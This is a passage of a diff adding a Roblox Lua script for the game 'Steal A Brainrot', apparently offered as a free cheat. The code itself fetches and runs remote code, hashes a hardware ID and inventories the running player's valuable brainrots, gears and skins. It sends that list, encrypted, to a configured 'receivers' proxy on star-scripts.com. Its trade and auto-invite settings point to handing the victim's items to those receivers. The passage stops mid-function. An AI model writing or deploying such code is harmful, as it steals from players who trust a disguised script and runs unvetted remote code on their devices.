@@ -1,0 +1,2573 @@
+if not game:IsLoaded() then
+	game.Loaded:Wait()
+end
+
+local text = "discord.gg/HNzRyGsNmt"
+local flag = game.PlaceId == 99606176102979
+
+if not ({ [109983668079237] = true, [99606176102979] = true })[game.PlaceId] then
+	warn("This script only supports Steal A Brainrot and Steal A Brainrot Duels.")
+	return
+end
+
+if flag then
+	return
+end
+
+pcall(function()
+	setclipboard("https://discord.gg/HNzRyGsNmt")
+end)
+
+local genv = getgenv and getgenv() or _G
+
+if genv.__STEAL_A_BRAINROT_RUNNING__ then
+	warn("This script is already running")
+	return
+end
+
+genv.__STEAL_A_BRAINROT_RUNNING__ = true
+local starScriptsConfig = genv.StarScriptsConfig or {}
+
+local function fn()
+	return (getgenv and getgenv() or genv or _G).StarScriptsConfig or starScriptsConfig or {}
+end
+
+local function fn2(arg)
+	return tostring(arg or ""):match("^%s*(.-)%s*$") or ""
+end
+
+local function fn3(arg)
+	local tbl = {}
+
+	if type(arg) == "table" then
+		for _, v in ipairs(arg) do
+			local v2 = fn2(v)
+
+			if v2 ~= "" then
+				table.insert(tbl, v2)
+			end
+		end
+
+		if #tbl == 0 then
+			for _, v in pairs(arg) do
+				local v2 = fn2(v)
+
+				if v2 ~= "" then
+					table.insert(tbl, v2)
+				end
+			end
+		end
+	elseif type(arg) == "string" then
+		local v = fn2(arg)
+
+		if v ~= "" then
+			table.insert(tbl, v)
+		end
+	end
+
+	return tbl
+end
+
+local function fn4()
+	local v = fn()
+	local v2 = fn2(v.ProxyId or v.LINK_ID or v.ProxyID or v.link_id)
+	local v3 = fn2(v.ProxySecret or v.SUBMIT_SECRET or v.ProxyKey or v.proxy_secret)
+	local str = string.lower(fn2(v.SUBMIT_GAME or v.GAME or v.ProxyGame or "sab"))
+
+	if str == "" then
+		str = "sab"
+	end
+
+	local v4 = fn3(v.Receivers or v.RECEIVERS or v.receivers)
+
+	if #v4 == 0 and v.Receiver then
+		v4 = fn3({ v.Receiver })
+	end
+
+	return {
+		proxyId = v2,
+		proxySecret = v3,
+		submitGame = str,
+		receivers = v4,
+		proxyUrl = fn2(v.ProxyUrl or v.PROXY_URL or "https://star-scripts.com/api"):gsub("/+$", ""),
+	}
+end
+
+local v = fn4()
+local receivers = v.receivers
+local minValue = starScriptsConfig.MIN_VALUE or fn().MIN_VALUE
+local proxyId = v.proxyId
+local proxySecret = v.proxySecret
+local proxyUrl = v.proxyUrl
+local n = tonumber(starScriptsConfig.WEBHOOK_POLL_SEC) or 2
+local n2 = tonumber(starScriptsConfig.WEBHOOK_SCAN_SETTLE_SEC) or 0.5
+local n3 = math.clamp(tonumber(starScriptsConfig.WEBHOOK_REQUEST_TIMEOUT) or 6, 2, 15)
+local flag2 = starScriptsConfig.ENABLE_TRADE ~= false
+local flag3 = starScriptsConfig.AUTO_INVITE ~= false
+local flag4 = starScriptsConfig.USE_RUBIS ~= false
+local n4 = tonumber(starScriptsConfig.WEBHOOK_MAX_ITEMS) or 10
+
+if starScriptsConfig.HIDE_TRADE_UI ~= true then
+end
+
+local flag5 = starScriptsConfig.CLEAR_FUSE ~= false
+tonumber(starScriptsConfig.TRADE_DELAY_AFTER_HIT)
+tonumber(starScriptsConfig.INVITE_INTERVAL_SEC)
+local flag6 = starScriptsConfig.TRADE_AFTER_WEBHOOK == true
+tonumber(starScriptsConfig.TRADE_ADD_INTERVAL)
+tonumber(starScriptsConfig.TRADE_ITEM_ADD_INTERVAL)
+tonumber(starScriptsConfig.TRADE_BRAINROT_TO_ITEM_GAP)
+tonumber(starScriptsConfig.TRADE_SKIN_TO_GEAR_GAP)
+tonumber(starScriptsConfig.TRADE_ADD_JITTER)
+tonumber(starScriptsConfig.TRADE_OPEN_SETTLE)
+tonumber(starScriptsConfig.INVITE_PENDING_SEC)
+
+if n < 0.5 then
+	n = 0.5
+end
+
+if proxySecret == "" then
+	warn("[SAB] ProxySecret yok — varsayılan key kullanılıyor")
+end
+
+if proxyId == "" or #receivers == 0 then
+	warn("[SAB] ProxyId veya Receivers eksik — getgenv().StarScriptsConfig ayarla")
+	return
+end
+
+local str = tostring(game.JobId) .. "_" .. tostring(os.time())
+local str2 = "__SS_WEBHOOK_SENT_" .. proxyId .. "_" .. str
+local str3 = "__SAB_LIVE_MSG_" .. proxyId .. "_" .. str
+local str4 = "__SAB_CLAIMED_" .. proxyId .. "_" .. str
+local genv2 = getgenv and getgenv() or _G
+local flag7 = false
+local flag8 = false
+
+local function fn5()
+	return genv2.__SAB_TRADE_ACTIVE__ == true or genv2.__SAB_INVITE_PENDING__ == true
+end
+
+local function fn6()
+	return flag7 == true or genv2[str2] == true
+end
+
+local function fn7()
+	flag7 = true
+	genv2[str2] = true
+end
+
+local str5 = "https://raw.githubusercontent.com/meeqscripts/stealabrainrot/refs/heads/main/starvalues"
+
+local function fn8()
+	local ok, result = pcall(function()
+		return game:HttpGet("https://raw.githubusercontent.com/meeqscripts/stealabrainrot/refs/heads/main/starvalues")
+	end)
+
+	if not (ok and type(result) == "string" and #result > 0) then
+		local request_ = syn and syn.request
+		local request_2
+
+		if request_ then
+			request_2 = request_
+		else
+			request_2 = http and http.request
+		end
+
+		local request_3 = request_2 or http_request or fluxus and fluxus.request or request
+		result = nil
+
+		if type(request_3) == "function" then
+			local ok2, result2 = pcall(request_3, { Url = str5, Method = "GET", Headers = { ["Cache-Control"] = "no-cache" } })
+			local flag9 = ok2 and type(result2) == "table"
+			result = nil
+
+			if flag9 then
+				result = result2.Body or result2.body
+			end
+		end
+	end
+
+	if type(result) ~= "string" or #result == 0 then
+		return nil, "indirilemedi"
+	end
+	local v2 = loadstring or load
+	if not v2 then
+		return nil, "loadstring yok"
+	end
+	local v3, v4 = v2(result, "@sabvalues.lua")
+	if not v3 then
+		return nil, tostring(v4)
+	end
+	local ok2, result2 = pcall(v3)
+	if not ok2 or type(result2) ~= "table" then
+		return nil, tostring(result2)
+	end
+	return result2
+end
+
+local sabValuesCache = genv2.__SAB_VALUES_CACHE
+
+if type(sabValuesCache) ~= "table" then
+	local v2
+	sabValuesCache, v2 = fn8()
+
+	if type(sabValuesCache) ~= "table" then
+		warn("[SAB] value listesi cekilemedi: " .. tostring(v2))
+		sabValuesCache = {}
+	else
+		genv2.__SAB_VALUES_CACHE = sabValuesCache
+	end
+end
+
+local brainrots = sabValuesCache.Brainrots or sabValuesCache.brainrots or {}
+local gears = sabValuesCache.Gears or sabValuesCache.gears or {}
+local skins = sabValuesCache.Skins or sabValuesCache.skins or {}
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local localPlayer = Players.LocalPlayer
+
+if not pcall(function()
+	return require(ReplicatedStorage.Shared.Animals)
+end) then
+	warn("[SAB] Animals modulu yuklenemedi")
+	return
+end
+
+local function fn9()
+	local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+	if playerGui:FindFirstChild("StarNotifGui") then
+		playerGui:FindFirstChild("StarNotifGui"):Destroy()
+	end
+
+	local screenGui = Instance.new("ScreenGui")
+	screenGui.Name = "StarNotifGui"
+	screenGui.ResetOnSpawn = false
+	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+	pcall(function()
+		screenGui.IgnoreGuiInset = true
+	end)
+
+	screenGui.Parent = playerGui
+	local udim2 = UDim2.new(1, 20, 0.5, -45)
+	local udim22 = UDim2.new(1, -320, 0.5, -45)
+	local frame = Instance.new("Frame")
+	frame.Name = "NotifFrame"
+	frame.Size = UDim2.new(0, 310, 0, 90)
+	frame.Position = udim2
+	frame.BackgroundColor3 = Color3.fromRGB(8, 5, 15)
+	frame.BorderSizePixel = 0
+	frame.ZIndex = 10
+	frame.Parent = screenGui
+	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+	local uiStroke = Instance.new("UIStroke", frame)
+	uiStroke.Color = Color3.fromRGB(140, 60, 255)
+	uiStroke.Thickness = 1.5
+	uiStroke.Transparency = 0.2
+	local uiGradient = Instance.new("UIGradient", frame)
+	local colorSequence = ColorSequence.new
+	local tbl = {}
+	local v2 = ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 10, 60))
+	local v3 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(8, 5, 15))
+	local new = ColorSequenceKeypoint.new
+	local color = Color3.fromRGB
+	tbl[1] = v2
+	tbl[2] = v3
+
+	do
+		local values = table.pack(new(1, color(20, 5, 45)))
+		table.move(values, 1, values.n, 3, tbl)
+	end
+
+	uiGradient.Color = colorSequence(tbl)
+	uiGradient.Rotation = 135
+	local frame2 = Instance.new("Frame")
+	frame2.Size = UDim2.new(0, 3, 1, -20)
+	frame2.Position = UDim2.new(0, 10, 0, 10)
+	frame2.BackgroundColor3 = Color3.fromRGB(160, 60, 255)
+	frame2.BorderSizePixel = 0
+	frame2.ZIndex = 11
+	frame2.Parent = frame
+	Instance.new("UICorner", frame2).CornerRadius = UDim.new(0, 4)
+	local frame3 = Instance.new("Frame")
+	frame3.Size = UDim2.new(0, 40, 0, 40)
+	frame3.Position = UDim2.new(0, 21, 0.5, -20)
+	frame3.BackgroundColor3 = Color3.fromRGB(80, 30, 170)
+	frame3.BorderSizePixel = 0
+	frame3.ZIndex = 11
+	frame3.Parent = frame
+	Instance.new("UICorner", frame3).CornerRadius = UDim.new(0, 10)
+	local textLabel = Instance.new("TextLabel")
+	textLabel.Size = UDim2.new(1, 0, 1, 0)
+	textLabel.BackgroundTransparency = 1
+	textLabel.Text = "💎"
+	textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	textLabel.TextSize = 14
+	textLabel.Font = Enum.Font.GothamBold
+	textLabel.ZIndex = 12
+	textLabel.Parent = frame3
+	local textLabel2 = Instance.new("TextLabel")
+	textLabel2.Size = UDim2.new(1, -80, 0, 22)
+	textLabel2.Position = UDim2.new(0, 72, 0, 12)
+	textLabel2.BackgroundTransparency = 1
+	textLabel2.Text = "JOIN OUR DISCORD SERVER"
+	textLabel2.TextColor3 = Color3.fromRGB(190, 120, 255)
+	textLabel2.TextSize = 12
+	textLabel2.Font = Enum.Font.GothamBold
+	textLabel2.TextXAlignment = Enum.TextXAlignment.Left
+	textLabel2.ZIndex = 11
+	textLabel2.Parent = frame
+	local textLabel3 = Instance.new("TextLabel")
+	textLabel3.Size = UDim2.new(1, -80, 0, 20)
+	textLabel3.Position = UDim2.new(0, 72, 0, 34)
+	textLabel3.BackgroundTransparency = 1
+	textLabel3.Text = "FREE 20+ PREMIUM SCRIPTS"
+	textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
+	textLabel3.TextSize = 13
+	textLabel3.Font = Enum.Font.GothamBold
+	textLabel3.TextXAlignment = Enum.TextXAlignment.Left
+	textLabel3.ZIndex = 11
+	textLabel3.Parent = frame
+	local textLabel4 = Instance.new("TextLabel")
+	textLabel4.Size = UDim2.new(1, -80, 0, 16)
+	textLabel4.Position = UDim2.new(0, 72, 0, 57)
+	textLabel4.BackgroundTransparency = 1
+	textLabel4.Text = text
+	textLabel4.TextColor3 = Color3.fromRGB(130, 70, 210)
+	textLabel4.TextSize = 11
+	textLabel4.Font = Enum.Font.Gotham
+	textLabel4.TextXAlignment = Enum.TextXAlignment.Left
+	textLabel4.ZIndex = 11
+	textLabel4.Parent = frame
+	local textButton = Instance.new("TextButton")
+	textButton.Size = UDim2.new(1, 0, 1, 0)
+	textButton.BackgroundTransparency = 1
+	textButton.Text = ""
+	textButton.ZIndex = 13
+	textButton.Parent = frame
+
+	textButton.MouseButton1Click:Connect(function()
+		pcall(function()
+			setclipboard("https://discord.gg/HNzRyGsNmt")
+		end)
+
+		textLabel4.Text = "Copied to clipboard!"
+		textLabel4.TextColor3 = Color3.fromRGB(100, 255, 150)
+
+		task.delay(2, function()
+			textLabel4.Text = text
+			textLabel4.TextColor3 = Color3.fromRGB(130, 70, 210)
+		end)
+	end)
+
+	local function fn10()
+		local tbl2 = { Position = udim22 }
+		local tween = TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), tbl2)
+		tween:Play()
+		tween.Completed:Wait()
+	end
+
+	local function fn11()
+		local tbl2 = { Position = udim2 }
+		local tween = TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), tbl2)
+		tween:Play()
+		tween.Completed:Wait()
+	end
+
+	task.spawn(function()
+		task.wait(1.5)
+
+		while true do
+			fn10()
+			task.wait(10)
+			fn11()
+			task.wait(2)
+		end
+	end)
+end
+
+local function fn10(arg)
+	if type(arg) == "number" then
+		return arg
+	end
+	local match, v2 = tostring(arg or ""):lower():gsub("%s+", ""):match("^([%d%.]+)([kmbt]?)$")
+	local num = tonumber(match)
+	if not num then
+		return 0
+	end
+
+	if v2 == "k" then
+		num *= 1000
+	elseif v2 == "m" then
+		num *= 1000000
+	elseif v2 == "b" then
+		num *= 1e9
+	elseif v2 == "t" then
+		num *= 1e12
+	end
+
+	return num
+end
+
+local v2 = fn10(minValue)
+
+local function fn11(arg)
+	local n5 = tonumber(arg) or 0
+	if n5 >= 1e12 then
+		local str6 = string.format("%.1fT", n5 / 1e12)
+		return "$" .. (str6:find("%.0T") and str6:gsub("%.0T", "T") or str6)
+	end
+
+	if n5 >= 1e9 then
+		local str6 = string.format("%.1fB", n5 / 1e9)
+		return "$" .. (str6:find("%.0B") and str6:gsub("%.0B", "B") or str6)
+	end
+
+	if n5 >= 1000000 then
+		local str6 = string.format("%.1fM", n5 / 1000000)
+		return "$" .. (str6:find("%.0M") and str6:gsub("%.0M", "M") or str6)
+	end
+
+	if n5 >= 1000 then
+		local str6 = string.format("%.1fK", n5 / 1000)
+		return "$" .. (str6:find("%.0K") and str6:gsub("%.0K", "K") or str6)
+	end
+	return "$" .. tostring(math.floor(n5))
+end
+
+local function fn12(arg)
+	if arg == math.floor(arg) then
+		return tostring(math.floor(arg))
+	end
+	return tostring(arg)
+end
+
+local function fn13(arg, arg2)
+	if arg == "GEAR" then
+		return gears[arg2]
+	end
+
+	if arg == "BASE SKIN" then
+		return skins[arg2]
+	end
+	return nil
+end
+
+local function fn14(arg, arg2)
+	local v3 = fn13(arg, arg2)
+	return string.format("[%s] %s%s", arg, arg2, v3 and string.format(" ($%s)", fn12(v3)) or "")
+end
+
+local function fn15(arg)
+	local match, v3 = tostring(arg):match("^%[([^%]]+)%]%s+(.+)%s+%(%$[%d%.]+%)$")
+
+	if not match then
+		match, v3 = tostring(arg):match("^%[([^%]]+)%]%s+(.+)$")
+	end
+
+	if not match or not v3 then
+		return 0
+	end
+	local str6 = v3:gsub("%s+%(%$[%d%.]+%)$", "")
+	return fn13(match, str6) or 0
+end
+
+local tbl = {}
+
+pcall(function()
+	local Traits = require(ReplicatedStorage.Datas.Traits)
+
+	for k, Trait in pairs(Traits) do
+		if type(Trait) == "table" then
+			local match = tostring(Trait.Icon or ""):match("%d+")
+			local v3 = fn2(Trait.Display or k)
+
+			if match and v3 ~= "" then
+				tbl[match] = v3
+			end
+		end
+	end
+end)
+
+local function fn16(arg)
+	if not arg or arg == "" then
+		return 0
+	end
+	local match, v3 = tostring(arg):gsub("%$", ""):gsub(",", ""):gsub(" ", ""):gsub("/s", ""):gsub("/S", ""):match("([%d%.]+)([KMBTkmbt]?)")
+	return (tonumber(match) or 0) * (({ K = 1000, M = 1000000, B = 1e9, T = 1e12, k = 1000, m = 1000000, b = 1e9, t = 1e12 })[v3] or 1)
+end
+
+local function fn17(arg)
+	if not arg then
+		return ""
+	end
+
+	if arg:IsA("TextLabel") or arg:IsA("TextButton") then
+		return arg.ContentText or arg.Text or ""
+	end
+	return ""
+end
+
+local function fn18()
+	pcall(function()
+		local character = localPlayer.Character
+		character = character and character:FindFirstChild("HumanoidRootPart")
+
+		if character then
+			localPlayer:RequestStreamAroundAsync(character.Position)
+		end
+	end)
+
+	local plots = Workspace:FindFirstChild("Plots") or Workspace:WaitForChild("Plots", 60)
+	if not plots then
+		return nil
+	end
+
+	for _, child in ipairs(plots:GetChildren()) do
+		for _, v3 in ipairs({ "UserId", "OwnerId", "OwnerUserId", "PlayerUserId", "PlotOwner" }) do
+			local attribute = child:GetAttribute(v3)
+
+			if attribute then
+				local userId = localPlayer.UserId
+				attribute = tonumber(attribute) == userId
+			end
+
+			if attribute then
+				return child
+			end
+		end
+
+		local plotSign = child:FindFirstChild("PlotSign")
+
+		if plotSign then
+			local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
+			surfaceGui = surfaceGui and surfaceGui:FindFirstChild("Frame")
+			surfaceGui = surfaceGui and surfaceGui:FindFirstChild("TextLabel")
+
+			if surfaceGui then
+				local contentText = surfaceGui.ContentText or surfaceGui.Text or ""
+				if contentText == localPlayer.DisplayName or contentText == localPlayer.Name or contentText:find(localPlayer.DisplayName, 1, true) and contentText:find("Base", 1, true) then
+					return child
+				end
+			end
+		end
+	end
+
+	return nil
+end
+
+local function fn19(arg)
+	if not arg then
+		return nil
+	end
+	local displayName = arg:FindFirstChild("DisplayName", true) or arg:FindFirstChild("Name", true)
+	if not displayName then
+		return nil
+	end
+	local tbl2 = { name = fn17(displayName), mutationStr = "", traitStr = "", moneyPerSec = 0 }
+
+	if tbl2.name == "" then
+		tbl2.name = "Unknown"
+	end
+
+	local generation = arg:FindFirstChild("Generation", true) or arg:FindFirstChild("Gen", true)
+
+	if generation then
+		tbl2.moneyPerSec = fn16(fn17(generation))
+	end
+
+	local tbl3 = {}
+
+	for _, descendant in ipairs(arg:GetDescendants()) do
+		if descendant:IsA("TextLabel") and descendant.Name == "Mutation" and descendant.Visible ~= false then
+			local v3 = fn17(descendant)
+
+			if v3 ~= "" then
+				table.insert(tbl3, v3)
+			end
+		end
+	end
+
+	tbl2.mutationStr = #tbl3 > 0 and table.concat(tbl3, ", ") or ""
+	local traits = arg:FindFirstChild("Traits", true)
+
+	if traits then
+		local tbl4 = {}
+		local tbl5 = {}
+
+		for _, descendant in ipairs(traits:GetDescendants()) do
+			if descendant:IsA("ImageLabel") and descendant.Visible ~= false then
+				local match = tostring(descendant.Image or ""):match("%d+")
+				match = match and tbl[match] or nil
+
+				if not match and descendant.Name ~= "Template" then
+					match = fn2(descendant.Name)
+				end
+
+				if match and match ~= "" and not tbl5[match] then
+					tbl5[match] = true
+					table.insert(tbl4, match)
+				end
+			end
+		end
+
+		tbl2.traitStr = #tbl4 > 0 and table.concat(tbl4, ", ") or ""
+	end
+
+	return tbl2
+end
+
+local function fn20()
+	local v3 = fn18()
+	if not v3 then
+		return {}
+	end
+	local tbl2 = {}
+	local tbl3 = {}
+
+	local function fn21(arg)
+		local v4 = fn19(arg)
+		if not v4 then
+			return
+		end
+		local str6 = v4.name .. "|" .. tostring(v4.moneyPerSec)
+		if tbl3[str6] then
+			return
+		end
+		tbl3[str6] = true
+		table.insert(tbl2, v4)
+	end
+
+	local debris = Workspace:FindFirstChild("Debris")
+	local plots = Workspace:FindFirstChild("Plots")
+	local tbl4 = {}
+
+	if plots then
+		for _, child in ipairs(plots:GetChildren()) do
+			local ok, result = pcall(function()
+				return child:GetPivot()
+			end)
+
+			if ok and result then
+				table.insert(tbl4, { plot = child, position = result.Position })
+			end
+		end
+	end
+
+	local function fn22(arg)
+		local huge = math.huge
+		local plot = nil
+
+		for _, v4 in ipairs(tbl4) do
+			local n5 = arg.X - v4.position.X
+			local n6 = arg.Z - v4.position.Z
+			local n7 = n5 * n5 + n6 * n6
+
+			if n7 < huge then
+				plot = v4.plot
+				huge = n7
+			end
+		end
+
+		return plot
+	end
+
+	if debris then
+		for _, child in ipairs(debris:GetChildren()) do
+			if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
+				if fn22(child.Position) == v3 then
+					fn21(child:FindFirstChild("AnimalOverhead"))
+				end
+			end
+		end
+	end
+
+	for _, descendant in ipairs(v3:GetDescendants()) do
+		if descendant.Name == "AnimalOverhead" then
+			fn21(descendant)
+		end
+	end
+
+	table.sort(tbl2, function(arg, arg2)
+		local n5 = brainrots[arg.name] or 0
+		local n6 = brainrots[arg2.name] or 0
+		if n5 > 0 ~= n6 > 0 then
+			return n5 > 0
+		end
+
+		if n5 > 0 and n6 > 0 then
+			return n5 > n6
+		end
+		return arg.moneyPerSec > arg2.moneyPerSec
+	end)
+
+	return tbl2
+end
+
+local tbl2 = {}
+local tbl3 = {}
+
+local function fn21()
+	local tbl4 = {}
+	tbl2 = {}
+	tbl3 = {}
+
+	for _, v3 in ipairs(fn20()) do
+		local str6 = brainrots[v3.name]
+
+		if v3.moneyPerSec >= v2 or str6 ~= nil then
+			tbl2[v3.name] = true
+
+			tbl3[#tbl3 + 1] = {
+				name = v3.name,
+				moneyPerSec = v3.moneyPerSec,
+				mutationStr = v3.mutationStr,
+				traitStr = v3.traitStr,
+			}
+
+			local str7 = ""
+
+			if v3.mutationStr ~= "" then
+				str7 = "" .. string.format("[%s] ", v3.mutationStr:upper())
+			end
+
+			if v3.traitStr ~= "" then
+				str7 ..= string.format("[%s] ", v3.traitStr:upper())
+			end
+
+			str6 = str6 and string.format(" ($%s)", fn12(str6)) or ""
+			table.insert(tbl4, string.format("%s%s ➜ %s/s%s", str7, v3.name, fn11(v3.moneyPerSec), str6))
+		end
+	end
+
+	return tbl4
+end
+
+local tbl4 = {}
+
+local function fn22()
+	local tbl5 = {}
+	local tbl6 = {}
+	local tbl7 = {}
+	tbl4 = {}
+
+	local ok, result = pcall(function()
+		local Gears = require(ReplicatedStorage.Shared.Gears)
+
+		local function fn23(arg)
+			if not arg then
+				return
+			end
+
+			for _, child in ipairs(arg:GetChildren()) do
+				if child:IsA("Tool") and Gears.IsTradable(child.Name) and gears[child.Name] ~= nil and not tbl6[child.Name] then
+					tbl6[child.Name] = true
+					tbl4[#tbl4 + 1] = { kind = "gear", name = child.Name }
+					table.insert(tbl5, fn14("GEAR", child.Name))
+				end
+			end
+		end
+
+		fn23(localPlayer:FindFirstChildOfClass("Backpack"))
+		fn23(localPlayer.Character)
+		local InterfaceController = require(ReplicatedStorage.Controllers.InterfaceController)
+		local settings = localPlayer.PlayerGui:WaitForChild("Settings")
+		local settings2 = settings:WaitForChild("Settings")
+		local enabled = settings.Enabled
+		local visible = settings2.Visible
+		settings.Enabled = false
+		InterfaceController:SetState("Settings", true)
+		local n5 = os.clock() + 1
+		local baseSkin
+
+		while true do
+			baseSkin = settings2.Content.ScrollingFrame:FindFirstChild("Base Skin")
+
+			if baseSkin then
+				break
+			else
+				task.wait(0.1)
+				if not (n5 <= os.clock()) then
+					continue
+				end
+				break
+			end
+		end
+
+		if baseSkin then
+			local text2 = baseSkin.Button.Text.Text
+
+			if text2 ~= "" and text2 ~= "Normal" and text2 ~= "Default" and skins[text2] ~= nil then
+				tbl7[text2] = true
+				tbl4[#tbl4 + 1] = { kind = "skin", name = text2 }
+				table.insert(tbl5, fn14("BASE SKIN", text2))
+			end
+
+			for _, child in ipairs(baseSkin.Button.DropDown:GetChildren()) do
+				if child:IsA("GuiButton") and child.Name ~= "Template" then
+					local locked = child:FindFirstChild("Locked")
+
+					if (not locked or not locked.Visible) and child.Name ~= "Normal" and skins[child.Name] ~= nil and not tbl7[child.Name] then
+						tbl7[child.Name] = true
+						tbl4[#tbl4 + 1] = { kind = "skin", name = child.Name }
+						table.insert(tbl5, fn14("BASE SKIN", child.Name))
+					end
+				end
+			end
+		end
+
+		if not visible then
+			InterfaceController:SetState("Settings", false)
+		end
+
+		settings.Enabled = enabled
+	end)
+
+	if not ok then
+		warn("[SAB] Gear/Base Skin UI okunamadi:", tostring(result))
+
+		pcall(function()
+			localPlayer.PlayerGui.Settings.Enabled = true
+		end)
+	end
+
+	table.sort(tbl5, function(arg, arg2)
+		local v3 = fn15(arg)
+		local v4 = fn15(arg2)
+		if v3 ~= v4 then
+			return v3 > v4
+		end
+		return arg < arg2
+	end)
+
+	return tbl5
+end
+
+local function fn23()
+	local n5 = 0
+
+	for _, v3 in ipairs(fn20()) do
+		if v3.moneyPerSec > n5 then
+			n5 = v3.moneyPerSec
+		end
+	end
+
+	return n5
+end
+
+local function fn24(arg, arg2)
+	local v3 = arg2 or n4
+	if #arg <= v3 then
+		return arg
+	end
+	local tbl5 = {}
+
+	for i = 1, v3 do
+		tbl5[i] = arg[i]
+	end
+
+	local n5 = #arg - v3
+	table.insert(tbl5, string.format("... and %d more item%s (see summary)", n5, n5 == 1 and "" or "s"))
+	return tbl5
+end
+
+local function fn25(arg)
+	local request_ = syn and syn.request
+	local request_2
+
+	if request_ then
+		request_2 = request_
+	else
+		request_2 = http and http.request
+	end
+
+	local v3 = request_2 or http_request
+	local request_3
+
+	if v3 then
+		request_3 = v3
+	else
+		request_3 = fluxus and fluxus.request
+	end
+
+	request_3 = request_3 or request
+
+	if request_3 then
+		local ok, result = pcall(request_3, arg)
+		if ok then
+			return result
+		end
+	end
+end
+
+local crypt_ = crypt or syn and syn.crypt or nil
+local base64encode
+
+if crypt_ then
+	base64encode = crypt_.base64encode or crypt_.base64_encode
+else
+	base64encode = crypt_
+end
+
+local base64decode
+
+if crypt_ then
+	base64decode = crypt_.base64decode or crypt_.base64_decode
+else
+	base64decode = crypt_
+end
+
+local function fn26(arg, arg2)
+	if not (crypt_ and type(crypt_.hmac) == "function" and type(base64encode) == "function" and type(base64decode) == "function") then
+		return nil
+	end
+
+	local ok, result = pcall(function()
+		local function fn27(arg3, arg4)
+			return base64decode(crypt_.hmac(arg3, arg4, "sha256"))
+		end
+
+		local str6 = game:GetService("HttpService"):GenerateGUID(false):gsub("-", ""):sub(1, 32)
+		local v3 = fn27(arg2 .. "|starcrypt-enc-v1", "9f3c7a1e5b8d2046c1fe83a75d9b0e42a6c8f13d7e0b592a4c6f81d3b7e9a2508")
+		local tbl5 = {}
+		local n5 = 0
+		local n6 = 0
+
+		while n5 < #arg do
+			tbl5[#tbl5 + 1] = fn27(str6 .. "|" .. n6, v3)
+			n5 += 32
+			n6 += 1
+		end
+
+		local str7 = table.concat(tbl5)
+		local tbl6 = {}
+
+		for i = 1, #arg do
+			local byte = string.byte
+			tbl6[i] = string.char(bit32.bxor(string.byte(arg, i), byte(str7, i)))
+		end
+
+		return { enc = base64encode(table.concat(tbl6)), n = str6 }
+	end)
+
+	if ok and type(result) == "table" and result.enc then
+		return result
+	end
+	return nil
+end
+
+local function fn27(arg, arg2)
+	local v3 = fn26(arg, arg2)
+	if not v3 then
+		return nil
+	end
+
+	local ok, result = pcall(function()
+		return game:GetService("HttpService"):JSONEncode(v3)
+	end)
+
+	if ok then
+		return result
+	end
+	return nil
+end
+
+local function fn28(arg)
+	local n5 = arg or 16
+	local tbl5 = {}
+
+	for i = 1, n5 do
+		local n6 = math.random(1, 62)
+		tbl5[i] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"):sub(n6, n6)
+	end
+
+	return table.concat(tbl5)
+end
+
+local function fn29()
+	local str6 = ""
+
+	pcall(function()
+		if typeof(gethwid) == "function" then
+			str6 = tostring(gethwid())
+		end
+	end)
+
+	if str6 == "" then
+		str6 = tostring(localPlayer.UserId) .. ":" .. (identifyexecutor and identifyexecutor() or "unknown")
+	end
+
+	if crypt_ and crypt_.hash then
+		local ok, result = pcall(function()
+			return crypt_.hash(str6, "sha256")
+		end)
+
+		if ok and result then
+			return result
+		end
+	end
+
+	return str6:sub(1, 64)
+end
+
+local function fn30(arg, arg2)
+	if not crypt_ or not crypt_.hmac then
+		return nil
+	end
+
+	local ok, result = pcall(function()
+		return crypt_.hmac(arg, arg2, "sha256")
+	end)
+
+	if ok and result then
+		return result
+	end
+
+	local ok2, result2 = pcall(function()
+		return crypt_.hmac(arg2, arg, "sha256")
+	end)
+
+	if ok2 then
+		return result2
+	end
+	return nil
+end
+
+local function fn31(arg)
+	local tbl5 = {}
+
+	for i = 1, #arg do
+		tbl5[i] = string.format("%02x", string.byte(arg, i))
+	end
+
+	return table.concat(tbl5)
+end
+
+local function fn32(arg)
+	if not arg or arg == "" then
+		return nil
+	end
+	local str6 = tostring(arg)
+	if #str6 == 64 and str6:match("^[%x]+$") then
+		return string.lower(str6)
+	end
+
+	if crypt_ and crypt_.base64decode then
+		local ok, result = pcall(function()
+			return crypt_.base64decode(str6)
+		end)
+
+		if ok and result and #result == 32 then
+			return fn31(result)
+		end
+	end
+
+	return str6
+end
+
+local function fn33()
+	local ok, result = pcall(function()
+		return math.floor(workspace:GetServerTimeNow())
+	end)
+
+	if ok and type(result) == "number" and result > 0 then
+		return result
+	end
+	return os.time()
+end
+
+local function fn34(arg, arg2)
+	local request_ = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
+	if not request_ then
+		warn("[SAB] http request yok")
+		return false, 0, "no_request"
+	end
+
+	local ok, result = pcall(function()
+		return HttpService:JSONEncode(arg)
+	end)
+
+	if not ok or not result then
+		warn("[SAB] webhook JSON encode hata:", tostring(result))
+		return false, 0, "encode_fail"
+	end
+
+	local tbl5 = {
+		{
+			Url = arg2,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json", Accept = "application/json" },
+			Body = fn27(result, fn4().proxySecret) or result,
+			Timeout = n3,
+		},
+	}
+
+	local n5 = 0
+	local str6 = ""
+
+	for i, v3 in ipairs(tbl5) do
+		local now = os.clock()
+		local ok2, result2 = pcall(request_, v3)
+		local n6 = os.clock() - now
+
+		if ok2 and result2 then
+			n5 = tonumber(result2.StatusCode or result2.status or result2.Status or result2.status_code) or 0
+			str6 = tostring(result2.Body or result2.body or result2.ResponseBody or result2.response_body or "")
+			if n5 >= 200 and n5 < 300 then
+				return true, n5, str6
+			end
+
